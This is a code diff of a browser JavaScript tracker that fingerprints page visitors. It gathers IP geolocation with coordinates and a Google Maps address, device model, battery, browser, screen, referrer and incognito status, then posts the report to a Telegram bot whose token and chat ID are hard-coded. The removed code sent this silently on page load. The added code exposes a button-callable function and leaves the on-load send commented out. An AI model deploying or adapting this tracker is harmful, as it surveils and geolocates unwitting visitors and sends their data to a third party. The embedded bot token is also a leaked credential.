@@ -23,15 +23,31 @@ async function getIPWithLocation() {
     }
 }
 
-async function getApproximateLocation() {
-    return null;
-}
-
-async function getInternetInfo() {
-    return { 
-        connection: { effectiveType: 'unknown', downlink: 'unknown', rtt: 'unknown', quality: 'Unknown' },
-        bandwidth: null 
-    };
+function getDeviceName() {
+    const ua = navigator.userAgent.toLowerCase();
+    let device = "Unknown Device";
+    
+    if (ua.includes('samsung')) {
+        if (ua.includes('sm-')) {
+            const match = ua.match(/sm-[a-z]\d+/);
+            if (match) device = `Samsung ${match[0].toUpperCase()}`;
+            else device = "Samsung Galaxy";
+        } else if (ua.includes('galaxy')) {
+            device = "Samsung Galaxy";
+        }
+    } else if (ua.includes('redmi') || ua.includes('xiaomi') || ua.includes('mi ')) {
+        device = "Xiaomi Phone";
+    } else if (ua.includes('pixel')) {
+        device = "Google Pixel";
+    } else if (ua.includes('iphone')) {
+        device = "iPhone";
+    } else if (ua.includes('ipad')) {
+        device = "iPad";
+    } else if (ua.includes('oneplus')) {
+        device = "OnePlus";
+    }
+    
+    return device;
 }
 
 function getDeviceInfo() {
@@ -50,25 +66,6 @@ function getDeviceInfo() {
     };
 }
 
-async function getGPUInfo() {
-    return { renderer: 'Unknown' };
-}
-
-function getConnectionInfo() {
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    return {
-        effectiveType: conn?.effectiveType || 'unknown',
-        downlink: conn?.downlink ? conn.downlink + ' Mbps' : 'unknown',
-        rtt: conn?.rtt ? conn.rtt + ' ms' : 'unknown',
-        saveData: conn?.saveData || false,
-        quality: 'Unknown'
-    };
-}
-
-function getStorageInfo() {
-    return { localStorage: '0 Bytes', sessionStorage: '0 Bytes', cookies: '0 chars' };
-}
-
 function getBrowserInfo() {
     const ua = navigator.userAgent;
     let browser = "Unknown";
@@ -81,17 +78,8 @@ function getBrowserInfo() {
     return {
         name: browser,
         version: ua.match(/(?:chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)?.[1] || "Unknown",
-        language: navigator.language,
-        languages: navigator.languages || []
+        language: navigator.language
     };
-}
-
-function getPluginsInfo() {
-    return { count: 0, plugins: [] };
-}
-
-async function getFontsList() {
-    return { error: "Font Access API not supported" };
 }
 
 function getScreenInfo() {
@@ -111,52 +99,8 @@ function getDisplayInfo() {
 
 function getPerformanceInfo() {
     return { 
-        timing: { total: performance.timing?.loadEventEnd - performance.timing?.navigationStart || 0 },
-        memory: null 
+        timing: { total: performance.timing?.loadEventEnd - performance.timing?.navigationStart || 0 }
     };
-}
-
-async function getPreciseLocation() {
-    return null;
-}
-
-function getDeviceName() {
-    const ua = navigator.userAgent.toLowerCase();
-    let device = "Unknown Device";
-    
-    if (ua.includes('samsung')) {
-        if (ua.includes('sm-')) {
-            const match = ua.match(/sm-[a-z]\d+/);
-            if (match) device = `Samsung ${match[0].toUpperCase()}`;
-            else device = "Samsung Galaxy";
-        } else if (ua.includes('galaxy')) {
-            device = "Samsung Galaxy";
-        }
-    } else if (ua.includes('redmi') || ua.includes('xiaomi') || ua.includes('mi ')) {
-        device = "Xiaomi Phone";
-    } else if (ua.includes('pixel')) {
-        device = "Google Pixel";
-    } else if (ua.includes('iphone')) {
-        device = "iPhone";
-        if (ua.includes('iphone15')) device = "iPhone 15";
-        else if (ua.includes('iphone14')) device = "iPhone 14";
-        else if (ua.includes('iphone13')) device = "iPhone 13";
-        else if (ua.includes('iphone12')) device = "iPhone 12";
-    } else if (ua.includes('ipad')) {
-        device = "iPad";
-    } else if (ua.includes('oneplus')) {
-        device = "OnePlus";
-    } else if (ua.includes('huawei') || ua.includes('honor')) {
-        device = "Huawei";
-    } else if (ua.includes('oppo')) {
-        device = "OPPO";
-    } else if (ua.includes('vivo')) {
-        device = "Vivo";
-    } else if (ua.includes('realme')) {
-        device = "Realme";
-    }
-    
-    return device;
 }
 
 async function getBatteryInfo() {
@@ -166,43 +110,19 @@ async function getBatteryInfo() {
             return {
                 charging: battery.charging,
                 level: Math.round(battery.level * 100) + "%",
-                chargingTime: battery.chargingTime === Infinity ? "Not Charging" : 
-                             battery.chargingTime === 0 ? "Fully Charged" : 
-                             Math.round(battery.chargingTime / 60) + " minutes",
-                dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : 
-                                Math.round(battery.dischargingTime / 60) + " minutes",
-                batterySaving: detectBatterySaving(),
-                accurate: true,
+                batterySaving: "Not detected",
                 notes: "Accurate reading"
             };
         } catch {
-            return { 
-                error: "Battery API blocked",
-                batterySaving: detectBatterySaving()
-            };
+            return { error: "Battery API blocked" };
         }
     }
-    return { 
-        error: "Battery API not supported",
-        batterySaving: detectBatterySaving()
-    };
-}
-
-function detectBatterySaving() {
-    const methods = [];
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection && connection.saveData) {
-        methods.push("Data Saver enabled");
-    }
-    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-        methods.push("Reduced motion enabled");
-    }
-    return methods.length > 0 ? methods.join(", ") : "No battery saving detected";
+    return { error: "Battery API not supported" };
 }
 
 async function getGoogleMapsLocation(ipData) {
     if (!ipData.latitude || !ipData.longitude) {
-        return "Location coordinates not available";
+        return null;
     }
     
     try {
@@ -221,21 +141,18 @@ async function getGoogleMapsLocation(ipData) {
         return {
             googleMapsLink: mapsLink,
             approximateAddress: address,
-            coordinates: `${ipData.latitude}, ${ipData.longitude}`,
-            accuracy: "IP-based (usually within 10-50km)"
+            coordinates: `${ipData.latitude}, ${ipData.longitude}`
         };
     } catch (error) {
-        return { error: "Failed to get maps location", details: error.message };
+        return null;
     }
 }
 
 async function detectIncognito() {
-    const tests = [];
-    
     const fsTest = await new Promise((resolve) => {
         const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
         if (!fs) {
-            resolve("FileSystem API not supported");
+            resolve(false);
             return;
         }
         
@@ -246,65 +163,39 @@ async function detectIncognito() {
         });
     });
     
-    tests.push({ method: "FileSystem", result: fsTest });
-    
-    const isIncognito = tests.some(test => test.result === true);
-    const uncertain = tests.every(test => 
-        test.result === false || 
-        typeof test.result === 'string' || 
-        test.result === "Unknown"
-    );
-    
     return {
-        isIncognito: isIncognito,
-        certainty: uncertain ? "Low" : isIncognito ? "High" : "Medium",
-        tests: tests,
-        notes: uncertain ? "Browser may be hiding incognito mode" : 
-               isIncognito ? "Incognito mode detected" : "Normal browsing mode"
+        isIncognito: fsTest === true,
+        certainty: fsTest === true ? "High" : "Medium",
+        notes: fsTest === true ? "Incognito mode detected" : "Normal browsing mode"
     };
 }
 
+// ========== MAIN COLLECT FUNCTION ==========
 async function collectEnhancedData() {
-    const data = {
+    const ipData = await getIPWithLocation();
+    const batteryData = await getBatteryInfo();
+    const incognitoData = await detectIncognito();
+    const mapsData = await getGoogleMapsLocation(ipData);
+    
+    return {
         timestamp: new Date().toISOString(),
         sessionId: generateSessionId(),
         deviceName: getDeviceName(),
-        ip: await getIPWithLocation(),
+        ip: ipData,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        approximateLocation: await getApproximateLocation(),
-        googleMaps: null,
-        internet: await getInternetInfo(),
+        googleMaps: mapsData,
+        battery: batteryData,
         device: getDeviceInfo(),
-        gpu: await getGPUInfo(),
-        battery: await getBatteryInfo(),
-        connection: getConnectionInfo(),
-        storage: getStorageInfo(),
         browser: getBrowserInfo(),
-        plugins: getPluginsInfo(),
-        fonts: await getFontsList(),
-        incognito: await detectIncognito(),
         screen: getScreenInfo(),
         display: getDisplayInfo(),
-        referrer: document.referrer,
-        cookies: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
         performance: getPerformanceInfo(),
-        preciseLocation: null,
-        interaction: {
-            clicks: 0,
-            keypresses: 0,
-            scrollDepth: 0,
-            timeOnSite: 0
-        }
+        incognito: incognitoData,
+        referrer: document.referrer || 'Direct visit'
     };
-    
-    if (data.ip.latitude && data.ip.longitude) {
-        data.googleMaps = await getGoogleMapsLocation(data.ip);
-    }
-    
-    return data;
 }
 
+// ========== TELEGRAM SEND FUNCTION ==========
 async function sendToTelegramBot(message) {
     const BOT_TOKEN = '7555872875:AAFL7IOocbY9nQhqL8GVkTvQYHkNrbnCTrs';
     const CHAT_ID = '7307197149';
@@ -335,12 +226,15 @@ async function sendToTelegramBot(message) {
     }
 }
 
-async function sendEnhancedDataToTelegram() {
+// ========== MAIN FUNCTION TO CALL FROM BUTTONS ==========
+async function sendFingerprintToTelegram() {
+    console.log("🔍 Collecting fingerprint data...");
+    
     try {
         const data = await collectEnhancedData();
         
         const telegramMessage = `
-🚀 ENHANCED TRACKING REPORT
+🚀 DEVICE FINGERPRINT REPORT
 
 📅 Time: ${new Date(data.timestamp).toLocaleString()}
 🆔 Session: ${data.sessionId}
@@ -359,74 +253,57 @@ Country: ${data.ip.country || 'Unknown'}
 ISP: ${data.ip.isp || 'Unknown'}
 Coordinates: ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}
 
-🗺️ GOOGLE MAPS
+🗺️ MAPS
 ${data.googleMaps ? data.googleMaps.approximateAddress : 'Location not available'}
 ${data.googleMaps ? data.googleMaps.googleMapsLink : ''}
-
-🌐 INTERNET
-Type: ${data.internet.connection.effectiveType || 'unknown'}
-Speed: ${data.internet.connection.downlink || 'unknown'}
-Latency: ${data.internet.connection.rtt || 'unknown'}
 
 🔋 BATTERY
 Level: ${data.battery.level || 'Unknown'}
 Charging: ${data.battery.charging ? 'Yes' : 'No'}
-Battery Saving: ${data.battery.batterySaving || 'Not detected'}
 
 🌐 BROWSER
 ${data.browser.name} ${data.browser.version}
 Language: ${data.browser.language}
-Incognito: ${data.incognito.isIncognito ? 'Yes' : 'No'} (${data.incognito.certainty} certainty)
+Incognito: ${data.incognito.isIncognito ? 'Yes' : 'No'}
 
 🖥️ SCREEN
 Resolution: ${data.screen.resolution.width}x${data.screen.resolution.height}
 Viewport: ${data.display.viewport.width}x${data.display.viewport.height}
-Pixel Ratio: ${data.screen.devicePixelRatio}
 Dark Mode: ${data.display.darkMode ? 'Enabled' : 'Disabled'}
 
 📊 PERFORMANCE
 Load Time: ${data.performance.timing ? Math.round(data.performance.timing.total) + 'ms' : 'N/A'}
 
 🔗 REFERRER
-${data.referrer || 'Direct visit'}
+${data.referrer}
 
 👤 USER AGENT:
-${data.device.userAgent.substring(0, 200)}...
+${data.device.userAgent.substring(0, 150)}...
         `.replace(/\*/g, '').replace(/[_]/g, '');
         
         const result = await sendToTelegramBot(telegramMessage);
         
         if (result && result.ok) {
-            console.log("✅ Enhanced data sent to Telegram");
+            console.log("✅ Fingerprint sent to Telegram!");
+            alert("✅ Device fingerprint sent to Telegram!");
+            return true;
+        } else {
+            console.log("❌ Failed to send");
+            alert("❌ Failed to send fingerprint");
+            return false;
         }
         
-        return data;
     } catch (error) {
-        console.error("❌ Failed to send data:", error);
-        return null;
+        console.error("❌ Error:", error);
+        alert("❌ Error collecting fingerprint");
+        return false;
     }
 }
 
-// ========== INITIALIZE ==========
-function setupEnhancedTracking() {
-    console.log("🔍 Setting up enhanced tracking...");
-    
-    // Send data when page loads
-    setTimeout(async () => {
-        const data = await sendEnhancedDataToTelegram();
-        if (data) {
-            console.log("✅ Enhanced tracking initialized");
-        }
-    }, 3000);
-}
+// ========== EXPOSE FUNCTION TO GLOBAL SCOPE ==========
+window.sendFingerprintToTelegram = sendFingerprintToTelegram;
 
-// Wait for DOM to load before running
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => {
-        console.log("DOM loaded, initializing tracking...");
-        setupEnhancedTracking();
-    });
-} else {
-    console.log("DOM already loaded, initializing tracking...");
-    setupEnhancedTracking();
-}
+// Optional: Auto-send when page loads (comment out if not needed)
+// setTimeout(() => {
+//     sendFingerprintToTelegram();
+// }, 3000);
